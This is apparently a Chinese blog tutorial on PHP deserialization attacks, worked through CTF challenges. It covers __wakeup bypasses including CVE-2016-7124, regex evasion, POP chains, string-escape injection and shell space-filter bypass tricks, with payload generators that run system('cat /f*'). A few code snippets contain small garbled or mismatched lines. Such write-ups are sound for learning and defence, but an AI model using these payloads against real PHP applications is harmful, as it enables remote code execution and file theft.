---
title: php序列化和反序列化
tags:
  - web攻防
  - web漏洞
categories: web漏洞
abbrlink: 2211845110
date: 2024-04-24 17:59:32
---

## 基本概念
serialize()     //序列化:将变量转换为可保存或传输的字符串的过程； 
unserialize()   //反序列化:在适当的时候把这个字符串再转化成原来的变量使用。

<!--more-->
```
<?php
class User{
    protected $name = 'ctf';
    private $isAdmin = true;
}
$user = new User();
echo serialize($user);
?>
```  
返回结果：`O:4:"User":2:{s:7:" * name";s:3:"ctf";s:13:" User isAdmin";b:1;}`  
这里O代表对象，这里是序列化的一个对象，要序列化数组的就用A
4表示的是类的长度
User表示是类名
2表示类里面有2个属性，也称为变量
s表示字符串的长度这里的 * name表示属性(注意*号两边有空格)
比如s:7:" * name" 这里表示的是  * name属性名（变量名）为7个字符串长度： 字符串 属性长度 属性值


### 访问控制修饰符
public（公有）：可以被任何类访问，没有限制。  
protected（受保护）：只能被其自身类、子类和父类访问。  
private（私有）：只能被其自身类访问，其他类无法直接访问。


**注意：**访问控制修饰符不同，序列化后属性的长度和属性值会有所不同：

public：属性被序列化的时候属性值会变成---`属性名`  
protected：属性被序列化的时候属性值会变成---`\x00*\x00属性名`  
private：属性被序列化的时候属性值会变成---`\x00类名\x00属性名`


### 魔术方法：  

常见的魔术方法：

```
__wakeup() //执行unserialize()时，先会调用这个函数
__sleep() //执行serialize()之前，先会调用这个函数
__destruct() //对象被销毁时触发
__call() //在对象上下文中调用不存在的方法时触发
__callStatic() //在静态上下文中调用不存在的方法时触发
__get() //用于从不存在的属性读取数据或者不存在这个键都会调用此方法
__set() //给不存在的成员属性赋值
__isset() //在不可访问的属性上调用isset()或empty()触发
__unset() //在不可访问的属性上使用unset()时触发
__toString() //把对象当作字符串使用时触发
__invoke() //当尝试将对象调用为函数时触发
注意：要触发魔术方法的前提是魔术方法所在类（或者对象）被调用，也就是你序列化或者反序列化的这个对象里面要包含有这个方法，否则是无法触发的

```

关键魔术方法的执行顺序：__sleep()*（在对象被序列化时调用）* -> __construct() -> __wakeup() -> __toString() -> __destruct()
<br>

## 一些绕过技巧

### 绕过空格：
```
${IFS}$9
{IFS}
$IFS
${IFS}
$IFS$1 //$1改成$加其他数字貌似都行
IFS
< 
<> 
{cat,flag.php}  //用逗号实现了空格功能，需要用{}括起来
%20   (space)
%09   (tab)
X=$'cat\x09./flag.php';$X       （\x09表示tab，也可以用\x20）
``` 
<br>

### 绕过wakeup方法： 
 
#### 1）把成员属性个数的值设置的比原来的大（版本：PHP5 < 5.6.25 | PHP7 < 7.0.10）
```
原本的payload-->  O:6:"secret":1:{s:4:"file";s:8:"flag.php";}
把成员属性值写成2，就可以绕过wakeup-->  O:6:"secret":2:{s:4:"file";s:8:"flag.php";}
```

#### 2）引用赋值绕过  
使用引用的方式让两个变量同时指向同一个内存地址，这样对其中一个变量操作时，另一个变量的值也会随之改变。
比如说：  
```
<?php
function test (&$a){
    $b=&$a;
    $b='123';
}
$a='11';
test($a);
echo $a;
//echo 123
```
这里先对$a赋值为11，然后在test方法内定义$b指向$a的内存地址并将其值改为123，于是最终输出123.  
下面用一道题`[UUCTF 2022 新生赛]ez_unser`进行演示：
```
<?php
show_source(__FILE__);

###very___so___easy!!!!
class test{
    public $a;
    public $b;
    public $c;
    public function __construct(){
        $this->a=1;
        $this->b=2;
        $this->c=3;
    }
    public function __wakeup(){
        $this->a='';
    }
    public function __destruct(){
        $this->b=$this->c;
        eval($this->a);
    }
}
$a=$_GET['a'];
if(!preg_match('/test":3/i',$a)){
    die("你输入的不正确！！！搞什么！！");
}
$bbb=unserialize($_GET['a']);
```
可以看出，我们最终要进行执行的$a在wakeup方法内被定义为空，并且这里禁止更改成员属性个数，所以我们考虑使用引用赋值进行绕过。payload如下：  
```
<?php
class test{
    public $a;
    public $b;
    public $c;
}
$o = new test();
$o->b = &$o->a;
$o->c = "system('cat /f*');";
echo serialize($o);
```

#### 3）__unserialize()魔术方法（要求PHP 7.4.0+）  
如果类中同时定义了 __unserialize() 和 __wakeup() 两个魔术方法，则只有 __unserialize() 方法会生效，__wakeup() 方法会被忽略。


### 绕过部分正则：  
绕过`'/[oc]:\d+:/i'`  
#### 1）加号+跳过正则判断（注意在url里传参时+要编码为%2B）  
```
preg_match('/[oc]:\d+:/i', $var)  //匹配o或c任意一个，冒号，至少一个数字，冒号，不区分大小写  
O:6:"secret":2:{s:4:"file";s:8:"flag.php";}  -->  O:+6:"secret":2:{s:4:"file";s:8:"flag.php";}
```

#### 2）数组绕过
```
<?php
$o = 'O:6:"secret":2:{s:4:"file";s:8:"flag.php";}';
echo serialize(array($o));

//a:1:{i:0;s:43:"O:6:"secret":2:{s:4:"file";s:8:"flag.php";}";}
```
<br>


## php序列化--任意命令执行

漏洞代码示例：
```
<?php
class Test{
    public $cmd = "whoami";
    function __wakeup()
    {
        system($this->cmd);
    }
}
$Obj = unserialize($_GET['cmd']);   //当unserialize运行，wakeup方法会自动执行，从而实现命令执行
?>
```

序列化字符串生成(`O:5:"Test1":1:{s:3:"cmd";s:6:"whoami";}`):
```
<?php  
class Test1{
    public $cmd = "whoami";
}
$test = new Test1();
echo serialize($test);
?>
```
然后更改`6:"whoami"`这两个参数即可执行任意命令。

### ctf例题：web_php_unserialize
![](serialize-unserialize/1.png)

这里对代码进行审计：
```
<?php 
class Demo { 
    private $file = 'index.php';  //这里首先定义file的值为index.php
    public function __construct($file) {   
        $this->file = $file;  //构造函数 __construct 接受一个参数 $file，并将私有属性 $file 设置为传入的值，所以我们在设置payload的时候应把fl4g.php传入$file
    }
    function __destruct() { 
        echo @highlight_file($this->file, true);   //在销毁对象时会自动调用，输出$file的值
    }
    function __wakeup() { 
        if ($this->file != 'index.php') {  //如果file不为index.php,那么把file的值该回index.php,所以这里我们需要做的就是令wakeup方法不执行
            //the secret is in the fl4g.php（自带的注释，提醒我们传入fl4g.php）
            $this->file = 'index.php'; 
        } 
    } 
}
if (isset($_GET['var'])) {   
    $var = base64_decode($_GET['var']);  //对$var进行base64解密，所以我们在设置payload时应该先进行base64加密再进行传参
    if (preg_match('/[oc]:\d+:/i', $var)) {   //php正则匹配，防止对象注入，如果检测到像 {s:4:'flag'}这样的参数，那么就会终止程序
        die('stop hacking!'); 
    } else {
        @unserialize($var);   //匹配失败则输出反序列化后的$var
    } 
} else { 
    highlight_file("index.php");   //否则输出index.php
} 
?>
```

所以构造payload,得到`O:4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}`,注意这里Demo file 中的Demo两边是有空格的:
```
<?php
file";s:8:"fl4g.php";}
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct(){
        echo @highlight_file($this->file,true);
    }
    function __wakeup(){
        if($this->file != 'index.php'){
            $this->file = 'index.php';
        }
    }
}
$var = new Demo("fl4g.php");
$o = serialize($var);
echo $o;
?>
```

绕过正则匹配(数字前面加一个”+”号)：  
`O:+4:"Demo":1:{s:10:" Demo file";s:8:"fl4g.php";}`

而要令wakeup方法不执行，就需要绕过wakeup方法，这里用到的是php的一个漏洞（CVE-2016-7124），把”Demo”后面的”1”参数改为2或者其他更大的整数：  
`O:+4:"Demo":2:{s:10:" Demo file";s:8:"fl4g.php";}`

这里还要先对payload进行加密，于是得到完整的构造payload代码：  
```
<?php
class Demo {
    private $file = 'index.php';
    public function __construct($file) {
        $this->file = $file;
    }
    function __destruct(){
        echo @highlight_file($this->file,true);
    }
    function __wakeup(){
        if($this->file != 'index.php'){
            $this->file = 'index.php';
        }
    }
}
$var = new Demo("fl4g.php");
$o = serialize($var);
echo $o;
$str1 = str_replace(":4:",":+4:",$o);
$str2 = str_replace(":1:",":2:",$str1);
$str3 = base64_encode($str2);
var_dump($str3);
?>
```

得到最终payload，`TzorNDoiRGVtbyI6Mjp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==`，输入到网页得到flag
![](serialize-unserialize/2.png)

![](serialize-unserialize/3.png)
<br>

## POP链的构造与应用
PHP POP链（Property-Oriented Programming Chain）是一种在PHP反序列化中常用的攻击技术。它利用面向属性编程的原理，通过构造特定的对象引用链来实现对程序**执行流程的控制**，从而触发特定的函数或方法调用。

构造POP链的首要条件是找到头和尾，也就是用户**能够传入参数的地方**和**最终执行函数的地方**，一般来说，构造POP链从尾部开始向前推导，找到上一个部分的触发点直到找到传参处，推导完成后再从头部进行构造POP链。

**反序列化的常见起点**:
__wakeup 一定会调用
__destruct 一定会调用
__toString 当一个对象被反序列化后又被当做字符串使用

**反序列化的常见中间跳板**:
__toString 当一个对象被当做字符串使用
__get 读取不可访问或不存在属性时被调用
__set 当给不可访问或不存在属性赋值时被调用
__isset 对不可访问或不存在的属性调用isset()或empty()时被调用。形如 $this->$func();

**反序列化的常见终点**:
__call 调用不可访问或不存在的方法时被调用
call_user_func 一般php代码执行都会选择这里
call_user_func_array 一般php代码执行都会选择这里

### ctf例题：[MoeCTF 2021]unserialize
源代码如下：
```
<?php
class entrance
{
    public $start;
    function __construct($start)
    {
        $this->start = $start;
    }
    function __destruct()
    {
        $this->start->helloworld();
    }
}
class springboard
{
    public $middle;
    function __call($name, $arguments)
    {
        echo $this->middle->hs;
    }
}
class evil
{
    public $end;
    function __construct($end)
    {
        $this->end = $end;
    }
    function __get($Attribute)
    {
        eval($this->end);
    }
}
if(isset($_GET['serialize'])) {
    unserialize($_GET['serialize']);
} else {
    highlight_file(__FILE__);
} 
```
1、首先找到头和尾，头是$_GET['serialize']，尾是__get方法内的eval函数。  
2、然后往前推导，触发__get方法的前提是用于从不存在的属性读取数据或者不存在这个键，注意到springboard类内的__call方法内的echo刚好满足条件。  
3、而调用__call方法的前提是在对象上下文中调用不存在的方法，刚好__destruct方法调用了一个不存在的函数，而__destruct方法在对象被销毁时触发。  
4、理一下执行顺序: __get -> __call -> __destruct  

得到payload：
```
<?php
class entrance
{
    public $start;
}
class springboard
{
    public $middle;
}
class evil
{
    public $end;
}
$o = new entrance();
$o->start = new springboard();
$o->start->middle = new evil();
$o->start->middle->end = 'system("cat /f*");';
echo serialize($o);
//O:8:"entrance":1:{s:5:"start";O:11:"springboard":1:{s:6:"middle";O:4:"evil":1:{s:3:"end";s:18:"system("cat /f*");";}}}
```  
get提交参数得到flag
![](serialize-unserialize/9.png)
<br>

## 字符串逃逸
PHP在反序列化时，是以 ;} 作为结尾的，后面的字符串不影响正常的反序列化。  
字符串逃逸是由于长度异常而导致后面注入字符串被正常解析，使得我们构造的恶意字符串逃逸到正常的属性值中，最终在反序列化后恶意修改了类属性。  
而字符串逃逸根据过滤函数，又分为**字符数减少**，和**字符数增多**。

### 字符数减少
多逃逸出一个成员属性，第一个字符串**减少**，**吃**掉有效代码，在第二个字符串构造代码。
  
假设preg_replace函数将system()替换为空，并且要增加一个成员v3，那么： 
`O:1:"A":2:{s:2:"v1";s:27:"abcsystem()system()system()";s:2:"v2";s:21:"1234567";s:2:"v3";N;}";}`  
会变成  
`O:1:"A":2:{s:2:"v1";s:27:"abc";s:2:"v2";s:21:"1234567";s:2:"v3";N;}";}` 成员v1的值长度为27，那么往后的`abc";s:2:"v2";s:21:"1234567`都是成员v1的值，而v3也就成功修改了类属性，于是N后面的`;}`成功闭合，最后的`";}`被丢弃。


### 字符数增多
构造出一个逃逸成员属性，第一个字符串**增多**，**吐**出多余代码，把多余位代码构造成逃逸的成员属性。

假设hi要被替换成hello（增加3个字符），并且我们需要移除成员属性v2，添加新的成员属性v3，
增加的`";s:2:"v3";s:2:"66";}`一共21位，那么我们将7个hi替换成hello即可，那么：  
原先的字符串： `O:1:"A":2:{s:2:"v1";s:2:"hi";s:2:"v2";s:3:"123";}`  
构造的payload： `O:1:"A":2:{s:2:"v1";s:35:"hihihihihihihi";s:2:"v3";s:2:"66";}";s:2:"v2";s:3:"123";}`  
过滤后的字符串为：  `O:1:"A":2:{s:2:"v1";s:35:"hellohellohellohellohellohellohello";s:2:"v3";s:2:"66";}`  ，原先后面的`";s:2:"v2";s:3:"123";}`被丢弃了。


### ctf例题：easy_serialize_php1（字符数减少）
![](serialize-unserialize/6.png)

代码审计：  
```
<?php

$function = @$_GET['f'];

function filter($img){
    $filter_arr = array('php','flag','php5','php4','fl1g');
    $filter = '/'.implode('|',$filter_arr).'/i';  
    //implode函数将数组用"|"组合成字符串，在生成的字符串的前后各加一个 '/'，将其变成一个正则表达式，i意味着不区分大小写
    return preg_replace($filter,'',$img);  
    //preg_replace 函数会在 $img 中查找匹配 $filter 的内容，并将其替换为空字符串。
}


if($_SESSION){
    unset($_SESSION);  
    //$_SESSION 是一个用来存储会话数据的超全局数组，在 PHP 中经常用于跨页面传递数据。如果会话存在则清空会话数据
}

$_SESSION["user"] = 'guest'; 
$_SESSION['function'] = $function; 

extract($_POST); 
//根据extract()我们可以进行变量覆盖，当我们POST传入SESSION[flag]=123时，$SESSION["user"]和$SESSION['function'] 全部会消失，只剩下SESSION[flag]=123。

if(!$function){  //$function为空则页面回到初始
    echo '<a href="index.php?f=highlight_file">source_code</a>';
}

if(!$_GET['img_path']){   //这里可以更改$_GET['img_path']或使$_GET['img_path']为空来达到读取flag的目的，我们选择使$_GET['img_path']为空
    $_SESSION['img'] = base64_encode('guest_img.png');   //如果$_GET['img_path']为空，则执行
}else{
    $_SESSION['img'] = sha1(base64_encode($_GET['img_path']));   
}

$serialize_info = filter(serialize($_SESSION));

if($function == 'highlight_file'){
    highlight_file('index.php');
}else if($function == 'phpinfo'){
    eval('phpinfo();'); //maybe you can find something in here!
}else if($function == 'show_image'){   //只有当function的值为show_image时，才能对$serialize_info进行反序列化和其他后续的操作。
    $userinfo = unserialize($serialize_info);
    echo file_get_contents(base64_decode($userinfo['img']));
} 
?>
```

将function设置成phpinfo，得到flag信息：
![](serialize-unserialize/5.png)

首先要知道我们需要序列化user，function，img。
```
$_SESSION["user"] = 'guest';
$_SESSION['function'] = $function;
$_SESSION['img']=base64_encode('guest_img.png');
```

构建代码输出序列化内容
```
<?php
$_SESSION["user"] = 'guest';
$_SESSION['function'] = 'z';
$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';  //d0g3_f1ag.php base64编码
var_dump(serialize($_SESSION));
?>
//得到string(90) "a:3:{s:4:"user";s:5:"guest";s:8:"function";s:1:"z";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}"
```

**注意：**序列化之后长度s获取的字符串的长度一定为s，否则会继续往后读，并且unserialize会把多余的字符串当垃圾处理，在{}内的就是正确的，{}后面的就都被丢弃。  
所以我们的目的是把`$_SESSION['img'] = base64_encode('guest_img.png');`这段代码的img属性放到{}外，然后在{}中注好新的img属性，于是他本来要求的img属性就被替换了。  
```
<?php
$_SESSION["user"] = 'flagflagflagflagflagphp';  //user里的内容会被过滤掉，然后会接着往后取23个字符
$_SESSION['function'] = '";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:2:"bb";}';
$_SESSION['img'] = 'ZDBnM19mMWFnLnBocA==';     //d0g3_f1ag.php base64编码
var_dump(serialize($_SESSION));
?>
```
得到  `a:3:{s:4:"user";s:23:"flagflagflagflagflagphp";s:8:"function";s:57:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"1";s:1:"2";}";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";}`  
}  
经过删除和过滤后，于是剩下(其中 *";s:8:"function";s:57:"* 是user的键值，而 *s:1:"a";s:2:"bb";* 是作为第3个序列化数组凑数的):  
  `a:3:{s:4:"user";s:23:"";s:8:"function";s:57:"";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:2:"bb";}`

构造payload：  
`_SESSION[user]=flagflagflagflagflagphp&_SESSION[function]=";s:3:"img";s:20:"ZDBnM19mMWFnLnBocA==";s:1:"a";s:2:"bb";}`  
得到了flag的所在
![](serialize-unserialize/7.png)

获取`/d0g3_fllllllag`的base64加密值`L2QwZzNfZmxsbGxsbGFn`（刚好也是20位），填入payload，得到最终payload：  
`_SESSION[user]=flagflagflagflagflagphp&_SESSION[function]=";s:3:"img";s:20:"L2QwZzNfZmxsbGxsbGFn";s:1:"a";s:2:"bb";}`   
取得flag
![](serialize-unserialize/8.png)
<br>
如果理解的还不是很清晰可以再去看一下夺命十三枪这道题，很不错

